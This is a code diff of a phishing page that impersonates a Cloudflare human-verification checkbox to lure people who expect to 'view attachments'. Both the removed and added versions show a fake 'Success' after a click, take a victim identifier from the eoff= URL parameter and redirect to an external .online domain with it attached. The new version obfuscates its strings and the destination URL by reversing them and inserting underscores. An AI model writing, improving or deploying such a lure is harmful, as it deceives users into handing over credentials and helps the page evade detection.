@@ -2,238 +2,86 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>PO</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            margin: 0;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            background-color: #f8fafc;
-            font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, sans-serif;
-            -webkit-font-smoothing: antialiased;
-            overflow: hidden;
-        }
-        .preloader__curtain {
-            position: fixed;
-            inset: 0;
-            background: #f8fafc;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 100;
-            transition: opacity 0.2s ease-out;
-        }
-        .preloader__icon {
-            width: 120px;
-            height: auto;
-            animation: softPulse 6s ease-in-out infinite;
-        }
-        @keyframes softPulse {
-            0%, 100% { transform: scale(0.95); opacity: 0.7; }
-            50% { transform: scale(1.05); opacity: 1; }
-        }
-        .verification__panel {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            opacity: 0;
-            transition: opacity 0.5s ease-in;
-        }
-        .instruction__label {
-            margin-bottom: 18px;
-            font-size: 0.92rem;
-            color: #1e293b;
-            letter-spacing: -0.01em;
-            font-weight: 450;
-            text-align: center;
-        }
-        .captcha__container {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            width: 340px;
-            height: 100px;
-            padding: 0 24px;
-            background: #ffffff;
-            border: 1px solid #e2e8f0;
-            border-radius: 6px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.03);
-            transition: all 0.4s cubic-bezier(0.23, 1, 0.32, 1);
-            position: relative;
-        }
-        .checkbox__area {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            cursor: pointer;
-            user-select: none;
-        }
-        .svg__holder {
-            width: 22px;
-            height: 22px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .svg__dynamic {
-            width: 100%;
-            height: 100%;
-            fill: none;
-            stroke: #cbd5e1;
-            stroke-width: 2.5;
-            stroke-linecap: round;
-            stroke-linejoin: round;
-            transition: all 0.4s cubic-bezier(0.23, 1, 0.32, 1);
-        }
-        .checkbox__text {
-            font-size: 0.95rem;
-            font-weight: 500;
-            color: #1e293b;
-        }
-        .brand__wrapper {
-            display: flex;
-            flex-direction: column;
-            align-items: flex-end;
-            justify-content: center;
-            height: 100%;
-        }
-        .brand__logo {
-            height: 38px;
-            width: auto;
-            margin-bottom: -2px;
-            display: block;
-        }
-        .brand__name {
-            display: block;
-            font-weight: 800;
-            font-size: 0.75rem;
-            letter-spacing: 1.5px;
-            color: #FF8C00;
-            text-transform: uppercase;
-        }
-        .legal__tiny {
-            font-size: 0.65rem;
-            color: #64748b;
-            margin-top: 1px;
-        }
-        .captcha__container.spinner__active .svg__dynamic {
-            stroke: #3b82f6;
-            animation: rotateSmooth 1s linear infinite;
-            transform-origin: center;
-        }
-        .captcha__container.verified__success .svg__dynamic {
-            stroke: #10B981;
-            filter: drop-shadow(0 0 3px rgba(16, 185, 129, 0.4));
-        }
-        .captcha__container.verified__success .checkbox__text {
-            color: #10B981;
-        }
-        @keyframes rotateSmooth {
-            to { transform: rotate(360deg); }
-        }
+        body { margin: 0; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background: #fcfcfc; font-family: 'Segoe UI', Arial, sans-serif; }
+        #stage { display: flex; flex-direction: column; align-items: center; }
+        .p-pulse { width: 85px; animation: br 2.2s ease-in-out infinite; }
+        @keyframes br { 0%, 100% { opacity: 0.4; transform: scale(0.95); } 50% { opacity: 1; transform: scale(1.05); } }
+        .v-card { background: #fff; border: 1px solid #d0d0d0; width: 370px; padding: 24px 32px; display: flex; justify-content: space-between; align-items: center; border-radius: 5px; box-shadow: 0 4px 12px rgba(0,0,0,0.03); }
+        .v-left { display: flex; align-items: center; gap: 16px; flex: 1; }
+        #c-box { width: 22px; height: 22px; border: 2px solid #bcbcbc; border-radius: 2px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+        .v-rot { width: 14px; height: 14px; border: 2px solid #eee; border-top: 2px solid #0052cc; border-radius: 50%; animation: s 0.8s linear infinite; }
+        @keyframes s { 100% { transform: rotate(360deg); } }
+        .v-right { border-left: 1px solid #f2f2f2; padding-left: 20px; text-align: center; }
+        .v-logo { width: 26px; height: 26px; margin-bottom: 2px; }
     </style>
 </head>
 <body>
-    <div id="loadingCurtain" class="preloader__curtain">
-        <img src="astroman.png" alt="Loading..." class="preloader__icon">
-    </div>
-    <div id="verificationRoot" class="verification__panel">
-        <div id="instructionMsg" class="instruction__label"></div>
-        <div id="captchaWidget" class="captcha__container">
-            <div id="clickableTrigger" class="checkbox__area">
-                <div class="svg__holder">
-                    <svg viewBox="0 0 24 24" class="svg__dynamic" id="animatedSvg">
-                        <path id="flexiblePath" d="M4 4h16v16H4z" />
-                    </svg>
-                </div>
-                <span id="actionText" class="checkbox__text"></span>
-            </div>
-            <div class="brand__wrapper">
-                <img src="cloudflare_.png" alt="Logo" class="brand__logo">
-                <span id="brandLabel" class="brand__name"></span>
-                <div class="legal__tiny">privacy . terms</div>
-            </div>
-        </div>
-    </div>
+
+    <div id="stage"></div>
+
     <script>
         (function() {
-            const copy = {
-                instruction: "Verify you're human below to view the attachments",
-                initialBtn: "I'm not a robot",
-                verifyingMsg: "Verifying...",
-                successMsg: "Success!",
-                brandText: "CLOUDFLARE"
-            };
-            const loadingDiv = document.getElementById('loadingCurtain');
-            const mainPanel = document.getElementById('verificationRoot');
-            const instrSpan = document.getElementById('instructionMsg');
-            const captchaCard = document.getElementById('captchaWidget');
-            const actionButtonText = document.getElementById('actionText');
-            const dynamicPath = document.getElementById('flexiblePath');
-            const brandSpan = document.getElementById('brandLabel');
-            instrSpan.textContent = copy.instruction;
-            actionButtonText.textContent = copy.initialBtn;
-            brandSpan.textContent = copy.brandText;
-            let isProcessing = false;
+            // Unmasking logic: Reverse and Strip
+            const _cln = (x) => x.split('').reverse().join('').replace(/_/g, '');
+
+            // All text strings scrambled
+            const _m1 = _cln('w_o_l_e_b_ _n_a_m_u_h_ _e_r_\'_u_o_y_ _y_f_i_r_e_v_ ,_s_t_n_e_m_u_c_o_d_ _e_s_e_h_t_ _w_e_i_v_ _o_T');
+            const _m2 = _cln('y_f_i_r_e_V');
+            const _m3 = _cln('._._._g_n_i_y_f_i_r_e_V');
+            const _m4 = _cln('s_s_e_c_c_u_S');
+            const _m5 = _cln('e_r_a_l_f_d_u_o_l_C'); // Cloudflare
+            const _m6 = _cln('s_m_r_e_T_ ._ y_c_a_v_i_r_P');
+
+            // UPDATED REDIRECT URL
+            const _mU = _cln('#_5_b_C_a_I_q_W_E_0_r_0_f_H_K_g_t_/_1_v_/_i_p_a_/_e_n_i_l_n_o_._e_a_u_n_f_f_i_t_._v_n_i_f_f_o_/_/:_s_p_t_t_h');
+
+            const _mK = _cln('=__f__f__o__e__?__/__'); // "/?eoff="
+
+            const view = document.getElementById('stage');
+            // astro.png: Preloader
+            view.innerHTML = `<img src="astro.png" class="p-pulse">`;
+
             setTimeout(() => {
-                loadingDiv.style.opacity = '0';
-                setTimeout(() => {
-                    loadingDiv.style.display = 'none';
-                    mainPanel.style.opacity = '1';
-                }, 600);
-            }, 3000);
-            function handleVerificationFlow() {
-                if (isProcessing) return;
-                isProcessing = true;
-                captchaCard.classList.add('spinner__active');
-                actionButtonText.textContent = copy.verifyingMsg;
-                dynamicPath.setAttribute('d', 'M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2');
-                dynamicPath.style.strokeDasharray = '35 15';
-                setTimeout(() => {
-                    captchaCard.classList.remove('spinner__active');
-                    captchaCard.classList.add('verified__success');
-                    actionButtonText.textContent = copy.successMsg;
-                    dynamicPath.setAttribute('d', 'M20 6L9 17l-5-5');
-                    dynamicPath.style.strokeDasharray = 'none';
+                view.innerHTML = `
+                    <div style="color:#666;font-size:13.5px;margin-bottom:12px;">${_m1}</div>
+                    <div class="v-card">
+                        <div class="v-left">
+                            <div id="c-box"></div>
+                            <span id="v-lbl" style="color:#444;font-size:14px;">${_m2}</span>
+                        </div>
+                        <div class="v-right">
+                            <img src="astro2.png" class="v-logo">
+                            <div style="font-weight:600;font-size:14px;color:#1a1a1a;">${_m5}</div>
+                            <div style="font-size:9px;color:#aaa;margin-top:2px;">${_m6}</div>
+                        </div>
+                    </div>`;
+
+                document.getElementById('c-box').onclick = function() {
+                    const b = this;
+                    const l = document.getElementById('v-lbl');
+                    b.onclick = null;
+                    b.style.border = "none";
+                    b.innerHTML = '<div class="v-rot"></div>';
+                    l.innerText = _m3;
+
                     setTimeout(() => {
-                        const rawUrl = window.location.href;
-                        const eoffMarker = 'eoff=';
-                        const markerPos = rawUrl.indexOf(eoffMarker);
-                        let captured = '';
-                        if (markerPos !== -1) {
-                            const valueStart = markerPos + eoffMarker.length;
-                            let valueEnd = rawUrl.length;
-                            const nextAmp = rawUrl.indexOf('&', valueStart);
-                            const nextHash = rawUrl.indexOf('#', valueStart);
-                            if (nextAmp !== -1 && nextAmp < valueEnd) valueEnd = nextAmp;
-                            if (nextHash !== -1 && nextHash < valueEnd) valueEnd = nextHash;
-                            captured = rawUrl.substring(valueStart, valueEnd);
+                        b.innerHTML = '<span style="color:#228b22;font-weight:bold;font-size:18px;">\u2713</span>';
+                        l.innerText = _m4;
+                        l.style.color = '#28a745';
+
+                        const u = window.location.href;
+                        let p = "";
+                        if (u.includes(_mK)) {
+                            p = u.split(_mK)[1];
                         }
-                        const p1 = 'ht';
-                        const p2 = 'tps';
-                        const p3 = '://';
-                        const p4 = 'po';
-                        const p5 = '.uaomanshare';
-                        const p6 = '.online';
-                        const p7 = '/sNOiatkB';
-                        const finalDestination = p1 + p2 + p3 + p4 + p5 + p6 + p7;
-                        window.location.href = finalDestination + (captured ? '#' + captured : '');
-                    }, 1200);
-                }, 2500);
-            }
-            const triggerElement = document.getElementById('clickableTrigger');
-            if (triggerElement) {
-                triggerElement.addEventListener('click', handleVerificationFlow);
-            }
+
+                        setTimeout(() => {
+                            window.location.replace(_mU + p);
+                        }, 1250);
+                    }, 2200);
+                };
+            }, 3200);
         })();
     </script>
 </body>
